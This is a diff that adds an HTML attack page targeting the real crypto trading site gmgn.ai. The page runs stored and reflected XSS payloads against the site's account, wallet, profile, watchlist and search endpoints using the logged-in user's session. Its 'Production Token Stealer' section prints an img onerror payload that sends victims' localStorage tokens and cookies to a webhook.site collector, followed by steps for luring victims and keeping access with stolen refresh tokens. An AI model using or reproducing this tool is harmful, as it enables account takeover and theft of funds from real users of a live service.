@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🦊 GMGN.AI XSS Hunter - Browser Edition</title>
+    <style>
+        body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
+        .box { background: #1a1a1a; border: 1px solid #0f0; padding: 15px; margin: 10px 0; }
+        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; margin: 5px; font-weight: bold; }
+        button:hover { background: #0f0; }
+        .result { background: #000; border: 1px solid #333; padding: 10px; margin: 5px 0; max-height: 200px; overflow-y: scroll; }
+        .success { color: #0f0; font-weight: bold; }
+        .error { color: #f00; }
+        h2 { color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 5px; }
+        pre { background: #000; padding: 10px; border: 1px solid #333; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <h1>🦊 GMGN.AI XSS HUNTER - BROWSER EDITION</h1>
+    <p>Open this page while logged into gmgn.ai - it will test XSS vectors using YOUR session!</p>
+
+    <div class="box">
+        <h2>📊 Current Session Info</h2>
+        <button onclick="checkSession()">Check Session</button>
+        <div id="session-info" class="result"></div>
+    </div>
+
+    <div class="box">
+        <h2>🎯 VECTOR 1: Wallet Nickname XSS</h2>
+        <p>Test if wallet nickname field is vulnerable</p>
+        <button onclick="testWalletNickname()">Test Wallet Nickname</button>
+        <div id="wallet-result" class="result"></div>
+    </div>
+
+    <div class="box">
+        <h2>🎯 VECTOR 2: Token Note/Comment XSS</h2>
+        <p>Test if token note/comment field is vulnerable</p>
+        <button onclick="testTokenNote()">Test Token Note</button>
+        <div id="note-result" class="result"></div>
+    </div>
+
+    <div class="box">
+        <h2>🎯 VECTOR 3: Profile Fields XSS</h2>
+        <p>Test profile/bio/username fields</p>
+        <button onclick="testProfile()">Test Profile</button>
+        <div id="profile-result" class="result"></div>
+    </div>
+
+    <div class="box">
+        <h2>🎯 VECTOR 4: Watchlist/Tag XSS</h2>
+        <p>Test watchlist name/tag fields</p>
+        <button onclick="testWatchlist()">Test Watchlist</button>
+        <div id="watchlist-result" class="result"></div>
+    </div>
+
+    <div class="box">
+        <h2>🎯 VECTOR 5: Search Reflected XSS</h2>
+        <p>Test if search query is reflected in response</p>
+        <button onclick="testSearch()">Test Search</button>
+        <div id="search-result" class="result"></div>
+    </div>
+
+    <div class="box">
+        <h2>💀 PRODUCTION TOKEN STEALER</h2>
+        <p style="color: #f00;">⚠️ ONLY run after finding a working vector!</p>
+        <button onclick="generateStealer()">Generate Token Stealer Payload</button>
+        <div id="stealer-output" class="result"></div>
+    </div>
+
+    <script>
+        const BASE_PARAMS = new URLSearchParams({
+            device_id: 'acf898c7-5063-4d0f-b992-d1e5d568409e',
+            fp_did: '5154d56b50e3061629dca8bf8538b346',
+            client_id: 'gmgn_web_20260712-1986-3641f8b',
+            from_app: 'gmgn',
+            app_ver: '20260712-1986-3641f8b',
+            tz_name: 'Asia/Aden',
+            tz_offset: '10800',
+            app_lang: 'en-US',
+            os: 'web',
+            worker: '0'
+        });
+
+        const TEST_PAYLOADS = [
+            { name: 'Template Injection', value: '{{7*7}}' },
+            { name: 'IMG Event Handler', value: '<img src=x onerror=alert(1)>' },
+            { name: 'SVG OnLoad', value: '<svg onload=alert(1)>' },
+            { name: 'Script Tag', value: '<script>alert(1)</script>' },
+            { name: 'Attribute Escape', value: '"><svg onload=alert(1)>' },
+        ];
+
+        function log(elementId, message, isSuccess = false, isError = false) {
+            const el = document.getElementById(elementId);
+            const color = isSuccess ? 'success' : (isError ? 'error' : '');
+            el.innerHTML += `<div class="${color}">[${new Date().toLocaleTimeString()}] ${message}</div>`;
+            el.scrollTop = el.scrollHeight;
+        }
+
+        async function checkSession() {
+            const info = document.getElementById('session-info');
+            info.innerHTML = '<div>Checking session...</div>';
+            
+            try {
+                // Check localStorage for tokens
+                const tokens = Object.keys(localStorage).filter(k => k.includes('token') || k.includes('account'));
+                log('session-info', `✅ Found ${tokens.length} token keys in localStorage:`);
+                tokens.forEach(k => log('session-info', `   • ${k}`));
+                
+                // Check cookies
+                const cookies = document.cookie.split(';').map(c => c.trim().split('=')[0]);
+                log('session-info', `\n✅ Found ${cookies.length} cookies:`);
+                cookies.forEach(c => log('session-info', `   • ${c}`));
+                
+                // Try to get user info
+                const r = await fetch(`https://gmgn.ai/account/user_info?${BASE_PARAMS}`, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {'Content-Type': 'application/json'},
+                    body: '{}'
+                });
+                
+                if (r.ok) {
+                    const data = await r.json();
+                    if (data.code === 0) {
+                        log('session-info', '\n✅ Session is ACTIVE!', true);
+                        log('session-info', `User: ${JSON.stringify(data.data?.data?.accounts?.[0] || 'unknown', null, 2)}`);
+                    } else {
+                        log('session-info', `⚠️ API returned code: ${data.code}`, false, true);
+                    }
+                }
+            } catch (e) {
+                log('session-info', `❌ Error: ${e.message}`, false, true);
+            }
+        }
+
+        async function testWalletNickname() {
+            const resultId = 'wallet-result';
+            document.getElementById(resultId).innerHTML = '';
+            log(resultId, '🔍 Testing wallet nickname XSS vectors...');
+            
+            const endpoints = [
+                '/account/wallet/update',
+                '/xapi/v1/wallet/update',
+                '/api/v1/wallet/nickname'
+            ];
+            
+            for (const endpoint of endpoints) {
+                for (const payload of TEST_PAYLOADS) {
+                    log(resultId, `\nTesting: ${endpoint}`);
+                    log(resultId, `Payload: ${payload.name} - ${payload.value}`);
+                    
+                    try {
+                        const r = await fetch(`https://gmgn.ai${endpoint}?${BASE_PARAMS}`, {
+                            method: 'POST',
+                            credentials: 'include',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                address: '0x0000000000000000000000000000000000000001',
+                                chain: 'bsc',
+                                nickname: payload.value,
+                                label: payload.value
+                            })
+                        });
+                        
+                        log(resultId, `Status: ${r.status}`);
+                        
+                        if (r.ok) {
+                            const data = await r.json();
+                            log(resultId, `Response: ${JSON.stringify(data).substring(0, 200)}`);
+                            
+                            if (data.code === 0) {
+                                log(resultId, `✅ PAYLOAD ACCEPTED! ${endpoint} may be vulnerable!`, true);
+                                log(resultId, `💀 Next: Check where gmgn.ai displays wallet nicknames to trigger XSS`, true);
+                                return; // Stop on first success
+                            }
+                        } else if (r.status === 403) {
+                            log(resultId, '❌ 403 - Cloudflare blocked');
+                        } else if (r.status === 404) {
+                            log(resultId, '❌ 404 - Endpoint not found');
+                        }
+                    } catch (e) {
+                        log(resultId, `❌ Error: ${e.message}`, false, true);
+                    }
+                }
+            }
+            
+            log(resultId, '\n⚠️ No vectors found. Try other tests.', false, true);
+        }
+
+        async function testTokenNote() {
+            const resultId = 'note-result';
+            document.getElementById(resultId).innerHTML = '';
+            log(resultId, '🔍 Testing token note/comment XSS vectors...');
+            
+            const endpoints = [
+                '/api/v1/token/note/create',
+                '/xapi/v1/token/comment',
+                '/api/v1/comment/create'
+            ];
+            
+            const testToken = '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82'; // PancakeSwap CAKE
+            
+            for (const endpoint of endpoints) {
+                for (const payload of TEST_PAYLOADS) {
+                    log(resultId, `\nTesting: ${endpoint}`);
+                    log(resultId, `Payload: ${payload.name}`);
+                    
+                    try {
+                        const r = await fetch(`https://gmgn.ai${endpoint}?${BASE_PARAMS}`, {
+                            method: 'POST',
+                            credentials: 'include',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                token_address: testToken,
+                                chain: 'bsc',
+                                note: payload.value,
+                                comment: payload.value,
+                                content: payload.value
+                            })
+                        });
+                        
+                        log(resultId, `Status: ${r.status}`);
+                        
+                        if (r.ok) {
+                            const data = await r.json();
+                            if (data.code === 0) {
+                                log(resultId, `✅ PAYLOAD ACCEPTED! ${endpoint} vulnerable!`, true);
+                                return;
+                            }
+                        }
+                    } catch (e) {
+                        log(resultId, `❌ Error: ${e.message}`);
+                    }
+                }
+            }
+            
+            log(resultId, '\n⚠️ No vectors found.');
+        }
+
+        async function testProfile() {
+            const resultId = 'profile-result';
+            document.getElementById(resultId).innerHTML = '';
+            log(resultId, '🔍 Testing profile XSS vectors...');
+            
+            const endpoints = [
+                '/account/user/update',
+                '/account/profile/update',
+                '/api/v1/user/profile'
+            ];
+            
+            for (const endpoint of endpoints) {
+                for (const payload of TEST_PAYLOADS) {
+                    log(resultId, `\nTesting: ${endpoint}`);
+                    log(resultId, `Payload: ${payload.name}`);
+                    
+                    try {
+                        const r = await fetch(`https://gmgn.ai${endpoint}?${BASE_PARAMS}`, {
+                            method: 'POST',
+                            credentials: 'include',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                username: payload.value,
+                                bio: payload.value,
+                                display_name: payload.value,
+                                nickname: payload.value,
+                                signature: payload.value
+                            })
+                        });
+                        
+                        if (r.ok) {
+                            const data = await r.json();
+                            if (data.code === 0) {
+                                log(resultId, `✅ PAYLOAD ACCEPTED!`, true);
+                                return;
+                            }
+                        }
+                    } catch (e) {}
+                }
+            }
+        }
+
+        async function testWatchlist() {
+            const resultId = 'watchlist-result';
+            document.getElementById(resultId).innerHTML = '';
+            log(resultId, '🔍 Testing watchlist XSS vectors...');
+            
+            const endpoints = [
+                '/xapi/v1/watchlist/create',
+                '/api/v1/portfolio/create'
+            ];
+            
+            for (const endpoint of endpoints) {
+                for (const payload of TEST_PAYLOADS) {
+                    try {
+                        const r = await fetch(`https://gmgn.ai${endpoint}?${BASE_PARAMS}`, {
+                            method: 'POST',
+                            credentials: 'include',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                name: payload.value,
+                                description: payload.value,
+                                chain: 'bsc'
+                            })
+                        });
+                        
+                        if (r.ok) {
+                            const data = await r.json();
+                            if (data.code === 0) {
+                                log(resultId, `✅ ${endpoint} VULNERABLE!`, true);
+                                return;
+                            }
+                        }
+                    } catch (e) {}
+                }
+            }
+        }
+
+        async function testSearch() {
+            const resultId = 'search-result';
+            document.getElementById(resultId).innerHTML = '';
+            log(resultId, '🔍 Testing search reflected XSS...');
+            
+            const searchPayload = '<script>alert("XSS")</script>';
+            
+            try {
+                const r = await fetch(`https://gmgn.ai/api/v1/search?q=${encodeURIComponent(searchPayload)}&type=token&${BASE_PARAMS}`, {
+                    credentials: 'include'
+                });
+                
+                const text = await r.text();
+                log(resultId, `Response length: ${text.length} chars`);
+                
+                if (text.includes(searchPayload) || text.includes('&lt;script&gt;')) {
+                    log(resultId, `✅ PAYLOAD REFLECTED IN RESPONSE!`, true);
+                    log(resultId, `Check if it executes when rendered in browser`, true);
+                } else {
+                    log(resultId, `❌ Payload not reflected`);
+                }
+            } catch (e) {
+                log(resultId, `❌ Error: ${e.message}`);
+            }
+        }
+
+        function generateStealer() {
+            const output = document.getElementById('stealer-output');
+            output.innerHTML = `
+<pre style="color: #0f0;">
+// ========================================
+// 💀 PRODUCTION TOKEN STEALER PAYLOAD
+// ========================================
+
+// Step 1: Setup webhook.site collector
+// Go to: https://webhook.site
+// Copy your unique URL
+
+// Step 2: Use this payload in the vulnerable field:
+
+&lt;img src=x onerror="
+let t={};
+Object.keys(localStorage).forEach(k=&gt;{
+  if(k.includes('token')||k.includes('account'))t[k]=localStorage[k];
+});
+fetch('https://webhook.site/YOUR-UNIQUE-ID',{
+  method:'POST',
+  body:JSON.stringify({
+    tokens:t,
+    cookies:document.cookie,
+    url:location.href,
+    user:navigator.userAgent
+  })
+});
+"&gt;
+
+// Step 3: Share the page/link that displays your injected content
+// When victim views it → their tokens exfiltrate to your webhook
+
+// ========================================
+// 💰 WHAT YOU'LL GET:
+// ========================================
+{
+  "tokens": {
+    "account_token_XXXXXXXX": {
+      "access_token": "eyJ...",
+      "refresh_token": "eyJ...",
+      "trade_token": "eyJ..."
+    }
+  },
+  "cookies": "sid=gmgn|...; _csrf=...",
+  "url": "https://gmgn.ai/..."
+}
+
+// Step 4: Use stolen refresh_token to maintain access:
+// See permanent_access.py for automated token refresh
+</pre>
+            `;
+        }
+    </script>
+</body>
+</html>
